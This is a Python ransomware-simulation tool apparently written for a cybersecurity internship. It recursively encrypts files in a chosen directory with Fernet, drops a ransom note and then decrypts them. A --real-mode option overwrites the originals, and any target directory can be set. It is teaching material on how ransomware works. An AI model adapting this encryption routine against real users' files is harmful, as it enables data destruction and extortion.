"""
Ransomware Simulation Tool - Educational Purpose Only
======================================================
Author: Cybersecurity Internship Project
Date: November 2025
Version: 1.0

DISCLAIMER: This tool is designed for EDUCATIONAL and RESEARCH purposes only.
It simulates ransomware behavior in a controlled environment to understand
how ransomware operates and to develop security awareness.

DO NOT use this tool on systems without explicit permission.
Unauthorized use may be illegal and unethical.
"""

import os
import sys
import json
import time
import hashlib
import logging
from datetime import datetime
from pathlib import Path
from typing import List, Dict
from cryptography.fernet import Fernet
import argparse


class RansomwareSimulator:
    """
    A controlled ransomware simulation tool for educational purposes.
    Demonstrates encryption/decryption operations with safety mechanisms.
    """
    
    def __init__(self, target_directory: str = None, simulation_mode: bool = True):
        """
        Initialize the ransomware simulator.
        
        Args:
            target_directory: Directory to simulate encryption on
            simulation_mode: Safety mode that prevents actual encryption
        """
        self.simulation_mode = simulation_mode
        self.target_directory = target_directory or self._create_test_directory()
        self.encryption_key = None
        self.encrypted_files = []
        self.log_file = self._setup_logging()
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Safety extensions - only simulate on test files
        self.safe_extensions = ['.txt', '.pdf', '.doc', '.docx', '.jpg', '.png']
        self.excluded_extensions = ['.exe', '.dll', '.sys', '.py']
        
        logging.info(f"Ransomware Simulator initialized - Session ID: {self.session_id}")
        logging.info(f"Target Directory: {self.target_directory}")
        logging.info(f"Simulation Mode: {self.simulation_mode}")
    
    def _setup_logging(self) -> str:
        """Setup logging configuration for the simulation."""
        log_dir = Path("Week 11/Logs")
        log_dir.mkdir(parents=True, exist_ok=True)
        
        log_filename = log_dir / f"ransomware_sim_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_filename),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        return str(log_filename)
    
    def _create_test_directory(self) -> str:
        """Create a safe test directory with sample files."""
        test_dir = Path("Week 11/TestFiles")
        test_dir.mkdir(parents=True, exist_ok=True)
        
        # Create sample test files
        sample_files = {
            "document1.txt": "This is a sample document for ransomware simulation.",
            "document2.txt": "Confidential data - Testing encryption capabilities.",
            "notes.txt": "Important notes that will be encrypted in simulation.",
            "data.txt": "Sample data file for educational purposes."
        }
        
        for filename, content in sample_files.items():
            file_path = test_dir / filename
            if not file_path.exists():
                file_path.write_text(content)
        
        logging.info(f"Created test directory with {len(sample_files)} sample files")
        return str(test_dir)
    
    def generate_encryption_key(self) -> bytes:
        """Generate a new encryption key using Fernet."""
        self.encryption_key = Fernet.generate_key()
        logging.info("Encryption key generated successfully")
        
        # Save key to file for recovery demonstration
        key_file = Path("Week 11") / f"encryption_key_{self.session_id}.key"
        key_file.write_bytes(self.encryption_key)
        logging.info(f"Encryption key saved to: {key_file}")
        
        return self.encryption_key
    
    def scan_target_directory(self) -> List[Path]:
        """
        Scan the target directory for files to encrypt.
        
        Returns:
            List of file paths that would be encrypted
        """
        target_path = Path(self.target_directory)
        files_to_encrypt = []
        
        logging.info(f"Scanning directory: {target_path}")
        
        for file_path in target_path.rglob('*'):
            if file_path.is_file():
                # Safety checks
                if file_path.suffix.lower() in self.excluded_extensions:
                    logging.warning(f"Skipping protected file: {file_path.name}")
                    continue
                
                if file_path.suffix.lower() in self.safe_extensions or self.simulation_mode:
                    files_to_encrypt.append(file_path)
                    logging.info(f"Target file found: {file_path.name}")
        
        logging.info(f"Total files identified for encryption: {len(files_to_encrypt)}")
        return files_to_encrypt
    
    def encrypt_file(self, file_path: Path) -> bool:
        """
        Encrypt a single file using Fernet encryption.
        
        Args:
            file_path: Path to the file to encrypt
            
        Returns:
            True if successful, False otherwise
        """
        try:
            if not self.encryption_key:
                raise ValueError("Encryption key not generated")
            
            # Read original file
            original_data = file_path.read_bytes()
            original_hash = hashlib.sha256(original_data).hexdigest()
            
            # Encrypt the data
            fernet = Fernet(self.encryption_key)
            encrypted_data = fernet.encrypt(original_data)
            
            if self.simulation_mode:
                # In simulation mode, create .encrypted copy instead of overwriting
                encrypted_path = file_path.with_suffix(file_path.suffix + '.encrypted')
                encrypted_path.write_bytes(encrypted_data)
                logging.info(f"[SIMULATION] Created encrypted copy: {encrypted_path.name}")
            else:
                # In real mode (use with extreme caution!)
                file_path.write_bytes(encrypted_data)
                file_path.rename(file_path.with_suffix(file_path.suffix + '.encrypted'))
                logging.warning(f"[REAL MODE] File encrypted: {file_path.name}")
            
            # Store encryption metadata
            self.encrypted_files.append({
                'original_path': str(file_path),
                'original_hash': original_hash,
                'encrypted_time': datetime.now().isoformat(),
                'file_size': len(original_data)
            })
            
            return True
            
        except Exception as e:
            logging.error(f"Error encrypting {file_path.name}: {str(e)}")
            return False
    
    def decrypt_file(self, file_path: Path) -> bool:
        """
        Decrypt a file using the stored encryption key.
        
        Args:
            file_path: Path to the encrypted file
            
        Returns:
            True if successful, False otherwise
        """
        try:
            if not self.encryption_key:
                raise ValueError("Encryption key not available")
            
            # Read encrypted file
            encrypted_data = file_path.read_bytes()
            
            # Decrypt the data
            fernet = Fernet(self.encryption_key)
            decrypted_data = fernet.decrypt(encrypted_data)
            
            # Restore original file
            original_path = file_path.with_suffix('')
            original_path.write_bytes(decrypted_data)
            
            if self.simulation_mode:
                # Keep the .encrypted file for demonstration
                logging.info(f"[SIMULATION] Decrypted to: {original_path.name}")
            else:
                # Remove encrypted file
                file_path.unlink()
                logging.info(f"[REAL MODE] File decrypted: {original_path.name}")
            
            return True
            
        except Exception as e:
            logging.error(f"Error decrypting {file_path.name}: {str(e)}")
            return False
    
    def execute_encryption_attack(self) -> Dict:
        """
        Execute the complete encryption attack simulation.
        
        Returns:
            Dictionary with attack statistics
        """
        print("\n" + "="*70)
        print("RANSOMWARE ATTACK SIMULATION - STARTING")
        print("="*70 + "\n")
        
        start_time = time.time()
        
        # Generate encryption key
        self.generate_encryption_key()
        
        # Scan for target files
        target_files = self.scan_target_directory()
        
        if not target_files:
            logging.warning("No target files found!")
            return {'status': 'failed', 'reason': 'No files to encrypt'}
        
        # Encrypt files
        successful_encryptions = 0
        failed_encryptions = 0
        
        print(f"\nEncrypting {len(target_files)} files...\n")
        
        for file_path in target_files:
            print(f"Encrypting: {file_path.name}...", end=" ")
            if self.encrypt_file(file_path):
                successful_encryptions += 1
                print("✓")
            else:
                failed_encryptions += 1
                print("✗")
            time.sleep(0.1)  # Simulate processing time
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Generate ransom note
        self._create_ransom_note()
        
        # Save attack report
        attack_report = {
            'session_id': self.session_id,
            'timestamp': datetime.now().isoformat(),
            'target_directory': self.target_directory,
            'simulation_mode': self.simulation_mode,
            'total_files_found': len(target_files),
            'successful_encryptions': successful_encryptions,
            'failed_encryptions': failed_encryptions,
            'duration_seconds': round(duration, 2),
            'encrypted_files': self.encrypted_files
        }
        
        report_path = Path("Week 11") / f"attack_report_{self.session_id}.json"
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(json.dumps(attack_report, indent=4))
        
        print(f"\n" + "="*70)
        print("ATTACK SIMULATION COMPLETE")
        print("="*70)
        print(f"Files encrypted: {successful_encryptions}/{len(target_files)}")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Report saved to: {report_path}")
        print(f"Log file: {self.log_file}")
        print("="*70 + "\n")
        
        return attack_report
    
    def execute_decryption_recovery(self, key_file: str = None) -> Dict:
        """
        Execute decryption to recover files.
        
        Args:
            key_file: Path to encryption key file
            
        Returns:
            Dictionary with recovery statistics
        """
        print("\n" + "="*70)
        print("RANSOMWARE DECRYPTION - RECOVERY MODE")
        print("="*70 + "\n")
        
        # Load encryption key if provided
        if key_file:
            key_path = Path(key_file)
            if key_path.exists():
                self.encryption_key = key_path.read_bytes()
                logging.info(f"Loaded encryption key from: {key_file}")
            else:
                logging.error(f"Key file not found: {key_file}")
                return {'status': 'failed', 'reason': 'Key file not found'}
        
        if not self.encryption_key:
            logging.error("No encryption key available for decryption")
            return {'status': 'failed', 'reason': 'No encryption key'}
        
        # Find encrypted files
        target_path = Path(self.target_directory)
        encrypted_files = list(target_path.rglob('*.encrypted'))
        
        if not encrypted_files:
            logging.warning("No encrypted files found!")
            return {'status': 'failed', 'reason': 'No encrypted files'}
        
        # Decrypt files
        successful_decryptions = 0
        failed_decryptions = 0
        
        print(f"\nDecrypting {len(encrypted_files)} files...\n")
        
        for file_path in encrypted_files:
            print(f"Decrypting: {file_path.name}...", end=" ")
            if self.decrypt_file(file_path):
                successful_decryptions += 1
                print("✓")
            else:
                failed_decryptions += 1
                print("✗")
            time.sleep(0.1)
        
        recovery_report = {
            'session_id': self.session_id,
            'timestamp': datetime.now().isoformat(),
            'total_encrypted_files': len(encrypted_files),
            'successful_decryptions': successful_decryptions,
            'failed_decryptions': failed_decryptions
        }
        
        print(f"\n" + "="*70)
        print("DECRYPTION COMPLETE")
        print("="*70)
        print(f"Files recovered: {successful_decryptions}/{len(encrypted_files)}")
        print("="*70 + "\n")
        
        return recovery_report
    
    def _create_ransom_note(self):
        """Create a ransom note file (for educational demonstration)."""
        ransom_note = """
===================================================================
                                                                   
          *** YOUR FILES HAVE BEEN ENCRYPTED ***                
                                                                   
===================================================================
                                                                   
  This is an EDUCATIONAL SIMULATION for cybersecurity training.   
                                                                   
  In a real ransomware attack:                                    
  - All your important files would be encrypted                   
  - Attackers would demand payment (often in cryptocurrency)      
  - There's no guarantee of file recovery even after payment      
                                                                   
  PROTECTION MEASURES:                                            
  + Regular backups on separate systems                          
  + Keep systems and antivirus updated                           
  + Be cautious with email attachments and links                 
  + Use strong passwords and multi-factor authentication         
  + Implement network segmentation                               
  + Train employees on security awareness                        
                                                                   
  To recover your files from this simulation:                     
  Run the decryption command with the generated key file.         
                                                                   
===================================================================

Session ID: {session_id}
Encryption Time: {timestamp}
Contact: This is a simulation - No real harm done!
"""
        
        note_path = Path(self.target_directory) / "RANSOM_NOTE.txt"
        note_path.write_text(ransom_note.format(
            session_id=self.session_id,
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ), encoding='utf-8')
        logging.info(f"Ransom note created: {note_path}")
    
    def generate_analysis_report(self):
        """Generate a comprehensive analysis report for the internship."""
        report_content = f"""
RANSOMWARE SIMULATION ANALYSIS REPORT
=====================================

Session ID: {self.session_id}
Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

1. SIMULATION OVERVIEW
   - Purpose: Educational demonstration of ransomware behavior
   - Mode: {'Simulation (Safe)' if self.simulation_mode else 'Real (Dangerous)'}
   - Target: {self.target_directory}

2. TECHNICAL DETAILS
   - Encryption Algorithm: Fernet (AES-128 in CBC mode)
   - Key Management: Symmetric encryption with secure key generation
   - File Selection: Pattern-based targeting with safety exclusions

3. ATTACK CHAIN PHASES
   a) Reconnaissance: Directory scanning and file identification
   b) Key Generation: Cryptographic key creation
   c) Encryption: File-by-file encryption with progress tracking
   d) Notification: Ransom note deployment
   e) Logging: Complete activity tracking

4. SECURITY IMPLICATIONS
   - Data Loss: Immediate inaccessibility of critical files
   - Business Impact: Operational disruption and potential downtime
   - Financial Risk: Ransom demands and recovery costs
   - Reputation: Trust damage and regulatory consequences

5. MITIGATION STRATEGIES
   - Preventive: Regular backups, security updates, user training
   - Detective: Anomaly detection, file integrity monitoring
   - Responsive: Incident response plan, offline backups
   - Recovery: Decryption tools, backup restoration

6. LESSONS LEARNED
   - Ransomware attacks are automated and indiscriminate
   - Encryption is fast and difficult to reverse without keys
   - Prevention is more effective than recovery
   - User awareness is critical for defense

7. FILES AND LOGS
   - Log File: {self.log_file}
   - Encryption Key: Week 11/encryption_key_{self.session_id}.key
   - Attack Report: Week 11/attack_report_{self.session_id}.json

DISCLAIMER: This simulation is for educational purposes only.
"""
        
        analysis_path = Path("Week 11") / f"analysis_report_{self.session_id}.txt"
        analysis_path.write_text(report_content)
        print(f"\n📊 Analysis report generated: {analysis_path}\n")
        logging.info(f"Analysis report created: {analysis_path}")


def main():
    """Main function with command-line interface."""
    parser = argparse.ArgumentParser(
        description='Ransomware Simulation Tool - Educational Purpose Only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run encryption simulation (safe mode)
  python "Ransomare tool.py" --mode encrypt
  
  # Run decryption with specific key
  python "Ransomare tool.py" --mode decrypt --key "Week 11/encryption_key_XXXXXXXX.key"
  
  # Use custom target directory
  python "Ransomare tool.py" --mode encrypt --target "Week 11/CustomTest"
  
  # Generate analysis report
  python "Ransomare tool.py" --mode analyze
        """
    )
    
    parser.add_argument(
        '--mode',
        choices=['encrypt', 'decrypt', 'analyze', 'demo'],
        default='demo',
        help='Operation mode: encrypt, decrypt, analyze, or demo (default: demo)'
    )
    
    parser.add_argument(
        '--target',
        type=str,
        help='Target directory for simulation (creates test directory if not specified)'
    )
    
    parser.add_argument(
        '--key',
        type=str,
        help='Path to encryption key file (required for decryption)'
    )
    
    parser.add_argument(
        '--real-mode',
        action='store_true',
        help='DANGEROUS: Disable simulation mode (requires confirmation)'
    )
    
    args = parser.parse_args()
    
    # Safety check for real mode
    simulation_mode = True
    if args.real_mode:
        print("\n⚠️  WARNING: You are about to disable simulation mode!")
        print("This will cause ACTUAL file encryption and potential data loss.")
        confirm = input("Type 'I UNDERSTAND THE RISKS' to continue: ")
        if confirm == 'I UNDERSTAND THE RISKS':
            simulation_mode = False
        else:
            print("Real mode cancelled. Running in safe simulation mode.")
    
    # Initialize simulator
    simulator = RansomwareSimulator(
        target_directory=args.target,
        simulation_mode=simulation_mode
    )
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║     RANSOMWARE SIMULATION TOOL - EDUCATIONAL USE ONLY     ║
    ║                                                           ║
    ║  This tool demonstrates ransomware attack patterns for   ║
    ║  cybersecurity education and awareness training.         ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    try:
        if args.mode == 'encrypt':
            simulator.execute_encryption_attack()
            simulator.generate_analysis_report()
            
        elif args.mode == 'decrypt':
            if not args.key:
                print("❌ Error: Decryption requires --key parameter")
                print("Example: python \"Ransomare tool.py\" --mode decrypt --key \"Week 11/encryption_key_XXXXXXXX.key\"")
                sys.exit(1)
            simulator.execute_decryption_recovery(args.key)
            
        elif args.mode == 'analyze':
            simulator.generate_analysis_report()
            print("✓ Analysis report generated successfully")
            
        elif args.mode == 'demo':
            print("\n🎬 Running complete demonstration...\n")
            time.sleep(1)
            
            # Step 1: Encryption
            print("STEP 1: ENCRYPTION ATTACK")
            simulator.execute_encryption_attack()
            
            time.sleep(2)
            
            # Step 2: Show ransom note
            print("\n" + "="*70)
            print("STEP 2: RANSOM NOTE DEPLOYED")
            print("="*70)
            ransom_note_path = Path(simulator.target_directory) / "RANSOM_NOTE.txt"
            if ransom_note_path.exists():
                print(ransom_note_path.read_text())
            
            time.sleep(2)
            
            # Step 3: Decryption
            print("\n" + "="*70)
            print("STEP 3: DECRYPTION RECOVERY")
            print("="*70 + "\n")
            simulator.execute_decryption_recovery()
            
            # Step 4: Analysis
            simulator.generate_analysis_report()
            
            print("\n✓ Complete demonstration finished successfully!")
            print(f"📁 All outputs saved to: Week 11/")
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Simulation interrupted by user")
        logging.warning("Simulation interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error occurred: {str(e)}")
        logging.error(f"Error in simulation: {str(e)}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
